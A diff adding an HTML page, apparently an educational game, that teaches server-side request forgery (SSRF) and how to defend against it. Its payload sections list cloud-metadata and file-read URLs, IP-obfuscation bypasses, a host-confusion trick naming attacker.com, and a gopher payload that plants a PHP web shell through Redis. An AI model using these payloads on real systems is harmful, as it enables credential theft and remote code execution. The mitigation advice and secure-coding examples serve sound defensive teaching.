@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Adventure: Hack The Server!</title>
+    <style>
+        :root {
+            --hacker-green: #00ff00;
+            --matrix-green: #20c20e;
+            --dark-bg: #121212;
+            --terminal-bg: #0a0a0a;
+            --neon-blue: #00b4ff;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: var(--dark-bg);
+            color: var(--hacker-green);
+            line-height: 1.6;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 255, 0, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0, 180, 255, 0.05) 0%, transparent 20%);
+        }
+        
+        .glitch {
+            text-shadow: 0 0 5px var(--hacker-green);
+            position: relative;
+            animation: glitch 2s infinite linear alternate;
+        }
+        
+        @keyframes glitch {
+            0% { text-shadow: 0 0 5px var(--hacker-green); }
+            25% { text-shadow: -2px -2px 5px var(--neon-blue); }
+            50% { text-shadow: 2px 2px 5px var(--matrix-green); }
+            100% { text-shadow: 0 0 5px var(--hacker-green); }
+        }
+        
+        .container {
+            background-color: var(--terminal-bg);
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            border: 1px solid var(--matrix-green);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.1);
+        }
+        
+        .demo-area {
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border: 1px dashed var(--neon-blue);
+        }
+        
+        h1, h2, h3 {
+            color: var(--matrix-green);
+        }
+        
+        h1 {
+            border-bottom: 1px solid var(--hacker-green);
+            padding-bottom: 10px;
+            font-size: 2.5em;
+        }
+        
+        pre {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 3px;
+            overflow-x: auto;
+            border-left: 3px solid var(--neon-blue);
+            color: var(--hacker-green);
+            font-family: 'Courier New', monospace;
+        }
+        
+        code {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: var(--hacker-green);
+            font-family: 'Courier New', monospace;
+        }
+        
+        button {
+            background-color: var(--terminal-bg);
+            color: var(--hacker-green);
+            border: 1px solid var(--matrix-green);
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+        }
+        
+        button:hover {
+            background-color: var(--matrix-green);
+            color: black;
+            box-shadow: 0 0 15px var(--matrix-green);
+        }
+        
+        .warning {
+            background-color: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid var(--matrix-green);
+        }
+        
+        th, td {
+            border: 1px solid var(--matrix-green);
+            padding: 12px;
+            text-align: left;
+        }
+        
+        th {
+            background-color: rgba(0, 255, 0, 0.1);
+            color: var(--hacker-green);
+        }
+        
+        tr:nth-child(even) {
+            background-color: rgba(0, 255, 0, 0.05);
+        }
+        
+        .tab {
+            overflow: hidden;
+            border: 1px solid var(--matrix-green);
+            background-color: var(--terminal-bg);
+            border-radius: 5px 5px 0 0;
+        }
+        
+        .tab button {
+            background-color: inherit;
+            float: left;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            padding: 14px 16px;
+            transition: 0.3s;
+            color: var(--hacker-green);
+        }
+        
+        .tab button:hover {
+            background-color: rgba(0, 255, 0, 0.2);
+        }
+        
+        .tab button.active {
+            background-color: var(--matrix-green);
+            color: black;
+        }
+        
+        .tabcontent {
+            display: none;
+            padding: 20px;
+            border: 1px solid var(--matrix-green);
+            border-top: none;
+            border-radius: 0 0 5px 5px;
+            background-color: var(--terminal-bg);
+            animation: fadeEffect 1s;
+        }
+        
+        @keyframes fadeEffect {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+        
+        #hacker-terminal {
+            background-color: black;
+            color: var(--hacker-green);
+            padding: 20px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            height: 300px;
+            overflow-y: auto;
+            border: 2px solid var(--matrix-green);
+            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+        
+        #terminal-input {
+            background-color: black;
+            color: var(--hacker-green);
+            border: 2px solid var(--matrix-green);
+            width: 80%;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            margin-top: 10px;
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .progress-container {
+            width: 100%;
+            background-color: rgba(0, 255, 0, 0.1);
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 30px;
+            background-color: var(--matrix-green);
+            border-radius: 5px;
+            width: 0%;
+            transition: width 1s;
+            text-align: center;
+            line-height: 30px;
+            color: black;
+            font-weight: bold;
+        }
+        
+        .achievement {
+            border: 1px solid var(--neon-blue);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            background-color: rgba(0, 180, 255, 0.1);
+            display: none;
+        }
+        
+        .achievement.unlocked {
+            display: block;
+            animation: unlock 1s;
+        }
+        
+        @keyframes unlock {
+            0% { transform: scale(0.5); opacity: 0; }
+            70% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <h1 class="glitch">🚀 SSRF Adventure: Hack The Server!</h1>
+    
+    <div class="warning">
+        ⚠️ <strong>WARNING:</strong> This is a game for educational purposes only. Real hacking without permission is illegal!
+    </div>
+
+    <div class="container">
+        <h2>1. 🎯 What is SSRF?</h2>
+        <p>Server-Side Request Forgery (SSRF) is like tricking a server into being your personal messenger pigeon 🕊️. You send it somewhere it shouldn't go!</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="concept-bar">0%</div>
+        </div>
+        
+        <p>When successful, SSRF can:</p>
+        <ul>
+            <li>🐦 Fetch secrets from internal systems</li>
+            <li>🏰 Bypass firewalls like a castle wall-jumper</li>
+            <li>☁️ Steal cloud server credentials</li>
+            <li>💣 Crash systems (Denial of Service)</li>
+            <li>🎭 Impersonate the server to attack internal services</li>
+        </ul>
+        
+        <div class="achievement" id="concept-achievement">
+            🏆 <strong>Concept Master!</strong> You've learned what SSRF is! +10 XP
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>2. 🧩 Vulnerability Requirements</h2>
+        <p>For SSRF to work, we need:</p>
+        
+        <table>
+            <tr>
+                <th>Component</th>
+                <th>Why It Matters</th>
+                <th>🎮 Game Equivalent</th>
+            </tr>
+            <tr>
+                <td>URL input point</td>
+                <td>Somewhere to inject our malicious URL</td>
+                <td>Like an unlocked door in a game</td>
+            </tr>
+            <tr>
+                <td>Server makes requests</td>
+                <td>The server must fetch our URL</td>
+                <td>The NPC that follows your orders</td>
+            </tr>
+            <tr>
+                <td>Internal network access</td>
+                <td>Server can reach sensitive systems</td>
+                <td>Secret areas on the game map</td>
+            </tr>
+            <tr>
+                <td>No proper validation</td>
+                <td>No bouncer to check our fake ID</td>
+                <td>No cheat detection in the game</td>
+            </tr>
+        </table>
+        
+        <div class="demo-area">
+            <h3>🔍 Spot the SSRF Vulnerability</h3>
+            <pre>
+// Vulnerable PHP code - can you see why?
+$url = $_GET['image_url'];
+$image = file_get_contents($url);
+echo "&lt;img src='data:image/jpeg;base64,".base64_encode($image)."'/&gt;";</pre>
+            <button onclick="showAnswer('answer1')">Reveal Answer</button>
+            <div id="answer1" style="display:none; margin-top:10px;">
+                <p>🎯 <strong>Vulnerability:</strong> Directly using user input (<code>$_GET['image_url']</code>) to fetch content with no validation!</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>3. ⚔️ How to Exploit SSRF</h2>
+        
+        <div class="tab">
+            <button class="tablinks active" onclick="openTab(event, 'step1')">Step 1: Recon</button>
+            <button class="tablinks" onclick="openTab(event, 'step2')">Step 2: Test</button>
+            <button class="tablinks" onclick="openTab(event, 'step3')">Step 3: Exploit</button>
+        </div>
+        
+        <div id="step1" class="tabcontent" style="display:block;">
+            <h3>🔎 Find the Input Points</h3>
+            <ul>
+                <li>Image uploads that fetch from URL</li>
+                <li>Webhook configurations</li>
+                <li>API endpoints that proxy requests</li>
+                <li>PDF generators that fetch resources</li>
+                <li>Document parsers (Word, Excel, etc.)</li>
+            </ul>
+        </div>
+        
+        <div id="step2" class="tabcontent">
+            <h3>🧪 Test for SSRF</h3>
+            <ol>
+                <li>Try basic external URL: <code>http://example.com</code></li>
+                <li>Test internal IPs: <code>http://localhost</code></li>
+                <li>Attempt cloud metadata: <code>http://169.254.169.254</code></li>
+                <li>Use different schemes: <code>file:///etc/passwd</code></li>
+            </ol>
+        </div>
+        
+        <div id="step3" class="tabcontent">
+            <h3>💥 Launch the Attack</h3>
+            <p>Based on what you find:</p>
+            <ul>
+                <li>Fetch internal system data</li>
+                <li>Scan internal ports</li>
+                <li>Access cloud metadata</li>
+                <li>Chain with other vulnerabilities</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>4. 🧨 SSRF Payload Arsenal</h2>
+        
+        <div class="demo-area">
+            <h3>🔫 Basic Payloads</h3>
+            <pre>
+# Internal systems
+http://localhost/admin
+http://192.168.1.1:8080
+http://127.0.0.1:3306
+
+# Cloud metadata
+http://169.254.169.254/latest/meta-data/ (AWS)
+http://metadata.google.internal/computeMetadata/v1/ (GCP)
+
+# File access
+file:///etc/passwd
+file:///c:/windows/win.ini</pre>
+        </div>
+        
+        <div class="demo-area">
+            <h3>🎭 Bypass Techniques</h3>
+            <pre>
+# IP obfuscation
+http://2130706433/ (127.0.0.1 in decimal)
+http://0x7f000001/ (hex)
+http://0177.0.0.1/ (octal)
+
+# URL encoding
+http://127.0.0.1%2523@attacker.com/
+
+# DNS tricks
+http://localtest.me (resolves to 127.0.0.1)
+http://spoofed.burpcollaborator.net</pre>
+        </div>
+        
+        <div class="demo-area">
+            <h3>💣 Advanced Attacks</h3>
+            <pre>
+# Redis RCE via SSRF
+gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$57%0D%0A%0A%0A%3C?php%20system($_GET['cmd']);%20?%3E%0A%0A%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A
+
+# Port scanning
+http://localhost:22 (check if SSH open)
+http://localhost:3306 (MySQL)
+http://localhost:5984 (CouchDB)</pre>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>5. 🧠 Advanced SSRF Techniques</h2>
+        
+        <div class="demo-area">
+            <h3>🌉 SSRF Chaining</h3>
+            <p>Combine SSRF with other vulnerabilities:</p>
+            <ul>
+                <li><strong>XXE → SSRF:</strong> Use XML external entities to trigger SSRF</li>
+                <li><strong>SSRF → RCE:</strong> Attack Redis, Memcached, etc.</li>
+                <li><strong>SSRF → XSS:</strong> Fetch malicious JS that runs in admin context</li>
+            </ul>
+        </div>
+        
+        <div class="demo-area">
+            <h3>👻 Blind SSRF</h3>
+            <p>When you don't see the response:</p>
+            <ol>
+                <li>Use timing to detect open ports</li>
+                <li>Trigger out-of-band interactions (DNS, HTTP)</li>
+                <li>Exploit side-effects (create users, change settings)</li>
+            </ol>
+        </div>
+        
+        <div class="demo-area">
+            <h3>🔄 DNS Rebinding</h3>
+            <pre>
+# First request resolves to allowed domain
+# Subsequent requests resolve to internal IP
+$ dig evil.com
+;; ANSWER SECTION:
+evil.com.      0    IN    A    192.168.1.100
+evil.com.      0    IN    A    54.210.12.34 (attacker IP)</pre>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>6. 🔍 Whitebox Code Review</h2>
+        <p>Finding SSRF during code review:</p>
+        
+        <table>
+            <tr>
+                <th>Language</th>
+                <th>Dangerous Functions</th>
+                <th>Safe Alternatives</th>
+            </tr>
+            <tr>
+                <td>PHP</td>
+                <td><code>file_get_contents()</code>, <code>fopen()</code>, <code>curl_exec()</code></td>
+                <td>Validate URLs, use allowlists</td>
+            </tr>
+            <tr>
+                <td>Python</td>
+                <td><code>urllib.request.urlopen()</code>, <code>requests.get()</code></td>
+                <td><code>urlparse</code> validation</td>
+            </tr>
+            <tr>
+                <td>Java</td>
+                <td><code>URLConnection</code>, <code>HttpClient</code></td>
+                <td>Use <code>URI</code> with validation</td>
+            </tr>
+            <tr>
+                <td>Node.js</td>
+                <td><code>http.get()</code>, <code>axios()</code></td>
+                <td>Use <code>dns.lookup</code> first</td>
+            </tr>
+        </table>
+        
+        <div class="demo-area">
+            <h3>🛡️ Secure Code Example</h3>
+            <pre>
+// Safe Java example
+public static boolean isAllowed(String url) {
+    try {
+        URI uri = new URI(url);
+        if (!Arrays.asList("http", "https").contains(uri.getScheme())) {
+            return false;
+        }
+        if (internalIpChecker.isInternal(uri.getHost())) {
+            return false;
+        }
+        return ALLOWED_DOMAINS.contains(uri.getHost());
+    } catch (URISyntaxException e) {
+        return false;
+    }
+}</pre>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>7. 🛡️ SSRF Mitigation</h2>
+        
+        <div class="demo-area">
+            <h3>🛡️ Defense Matrix</h3>
+            <ul>
+                <li><strong>Input Validation:</strong> Whitelist allowed domains and protocols</li>
+                <li><strong>Network Segmentation:</strong> Limit server's internal access</li>
+                <li><strong>Cloud Protections:</strong> Use IMDSv2 for AWS metadata</li>
+                <li><strong>Application Layer:</strong> Use dedicated service accounts</li>
+                <li><strong>Code Review:</strong> Audit all URL fetching functions</li>
+            </ul>
+        </div>
+        
+        <div class="demo-area">
+            <h3>🔒 Secure Coding Patterns</h3>
+            <pre>
+# Python example with validation
+from urllib.parse import urlparse
+import requests
+
+def safe_fetch(url):
+    parsed = urlparse(url)
+    if parsed.scheme not in ('http', 'https'):
+        raise ValueError("Invalid scheme")
+    if parsed.hostname in INTERNAL_IPS:
+        raise ValueError("Internal IP blocked")
+    if not parsed.hostname.endswith(ALLOWED_DOMAINS):
+        raise ValueError("Domain not allowed")
+    return requests.get(url, timeout=5)</pre>
+        </div>
+    </div>
+
+    <div class="container demo-area">
+        <h2>🎮 SSRF Hacking Simulator</h2>
+        
+        <div id="hacker-terminal">
+            <p>Welcome to the SSRF Hacking Simulator!</p>
+            <p>Your mission: Exploit the vulnerable server at <strong>vulnerable-server.local</strong></p>
+            <p>Available commands: <code>scan</code>, <code>exploit</code>, <code>show_creds</code>, <code>help</code></p>
+            <p>> <span id="terminal-output"></span><span class="blink">_</span></p>
+        </div>
+        
+        <input type="text" id="terminal-input" placeholder="Enter command..." onkeypress="handleTerminalInput(event)">
+        
+        <div class="achievement" id="hacker-achievement">
+            🏆 <strong>Elite Hacker!</strong> You pwned the server! +100 XP
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>8. 📚 SSRF Resources</h2>
+        
+        <ul>
+            <li>📜 <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank">OWASP SSRF Cheat Sheet</a></li>
+            <li>🎮 <a href="https://portswigger.net/web-security/ssrf" target="_blank">PortSwigger SSRF Interactive Tutorial</a></li>
+            <li>💣 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank">SSRF Payload Collection</a></li>
+            <li>☁️ <a href="https://cloudsecdocs.helpnetsecurity.com/02_cloud_platforms/" target="_blank">Cloud Metadata Service Exploits</a></li>
+            <li>🎥 <a href="https://www.youtube.com/watch?v=H9y6S2JKICk" target="_blank">Black Hat SSRF Talk</a></li>
+        </ul>
+    </div>
+
+    <script>
+        // Tab functionality
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+            }
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+        
+        // Show answer to code review question
+        function showAnswer(id) {
+            document.getElementById(id).style.display = 'block';
+            updateProgress(20);
+        }
+        
+        // Terminal simulator
+        function handleTerminalInput(e) {
+            if (e.key === 'Enter') {
+                const input = document.getElementById('terminal-input');
+                const command = input.value.toLowerCase();
+                const output = document.getElementById('terminal-output');
+                
+                output.innerHTML += command + '<br>';
+                
+                if (command === 'scan') {
+                    output.innerHTML += '> Scanning internal network...<br>';
+                    output.innerHTML += '> Found open ports: 22 (SSH), 80 (HTTP), 6379 (Redis)<br>';
+                } else if (command === 'exploit redis') {
+                    output.innerHTML += '> Exploiting Redis service...<br>';
+                    output.innerHTML += '> Uploading PHP web shell... Success!<br>';
+                    output.innerHTML += '> Web shell available at: http://vulnerable-server.local/shell.php<br>';
+                    document.getElementById('hacker-achievement').classList.add('unlocked');
+                } else if (command === 'show_creds') {
+                    output.innerHTML += '> Accessing cloud metadata...<br>';
+                    output.innerHTML += '> AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXXXXXXX<br>';
+                    output.innerHTML += '> AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY<br>';
+                } else if (command === 'help') {
+                    output.innerHTML += '> Available commands:<br>';
+                    output.innerHTML += '> scan - Scan internal network<br>';
+                    output.innerHTML += '> exploit - Exploit found services<br>';
+                    output.innerHTML += '> show_creds - Try to extract credentials<br>';
+                } else {
+                    output.innerHTML += '> Unknown command. Type "help" for available commands.<br>';
+                }
+                
+                input.value = '';
+                document.getElementById('hacker-terminal').scrollTop = document.getElementById('hacker-terminal').scrollHeight;
+            }
+        }
+        
+        // Progress bar animation
+        function updateProgress(percent) {
+            const bar = document.getElementById('concept-bar');
+            let width = parseInt(bar.style.width) || 0;
+            width += percent;
+            if (width > 100) width = 100;
+            bar.style.width = width + '%';
+            bar.innerHTML = width + '%';
+            
+            if (width >= 100) {
+                document.getElementById('concept-achievement').classList.add('unlocked');
+            }
+        }
+        
+        // Initialize progress
+        window.onload = function() {
+            updateProgress(10);
+        };
+    </script>
+</body>
+</html>
